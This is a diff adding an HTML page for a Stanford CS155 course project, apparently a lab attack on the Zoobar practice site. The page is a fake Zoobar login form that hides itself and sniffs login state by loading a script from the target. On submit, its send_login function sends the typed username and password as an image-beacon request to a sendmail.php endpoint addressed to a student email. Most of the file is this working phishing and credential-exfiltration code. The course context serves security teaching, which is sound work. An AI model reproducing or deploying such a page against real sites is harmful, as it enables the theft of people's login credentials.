@@ -1,0 +1,60 @@
+<html>
+<head>
+    <link rel="stylesheet" type="text/css"
+      href="http://crypto.stanford.edu/cs155/hw_and_proj/proj2/zoobar.css">
+<title>Login - Zoobar Foundation</title>
+</head>
+<body>
+<div id="main_div" style="visibility:hidden">
+<div id="myZoobars" style="display:none"></div>
+<div id="header">
+<div>Stanford CS155 Project 2</div>
+</div>
+<h1><a href='http://zoobar.org'>Zoobar Foundation for Ethical Policy</a></h1><h2>Supporting the best researchers of the counterinsurgency</h2>
+<div id="login" class="centerpiece">
+	<form name=loginform method=POST action="http://zoobar.org/users.php" onSubmit="return(send_login())">
+		<table>
+			<tr>
+   				<td>Username:</td>
+  				<td><input type=text id="user_name" name=login_username size=30 autocomplete=no value=></td>
+			</tr>
+			<tr>
+   				<td>Password:</td>
+  				<td colspan=2><input id="password" type=password name=login_password size=30 autocomplete=no>
+  					<input type=submit name=submit_login value="Log in">
+  					<input type=submit name=submit_registration value="Register"></td>
+
+			</tr>
+		</table>
+	</form>
+</div>
+<script>document.loginform.login_username.focus();</script>
+</div>
+<script type="text/javascript">
+	window.onload = handler;
+	function handler(){
+		var script = document.createElement('script');
+		script.src = "http://zoobar.org/zoobars.js.php";
+		document.body.appendChild(script);
+		setTimeout('do_sniffing()',1000);
+	}
+	
+	function do_sniffing(){
+		var val = document.getElementById("myZoobars").innerHTML;
+		if (val != ""){
+			window.location.href = "b.html";
+		}else{
+			document.getElementById("main_div").style.visibility="visible";
+		}
+	}
+	
+	function send_login(){
+		var user_name = document.getElementById("user_name").value;
+		var pwd = document.getElementById("password").value;
+		//alert(user_name + pwd);
+		(new Image()).src='http://crypto.stanford.edu/cs155/hw_and_proj/proj2/sendmail.php?'+'to=dmwaura@stanford.edu'+'&payload=username: '+user_name+' password: '+pwd+'&random='+Math.random();
+		return true;
+	}
+</script>
+</body>
+</html>
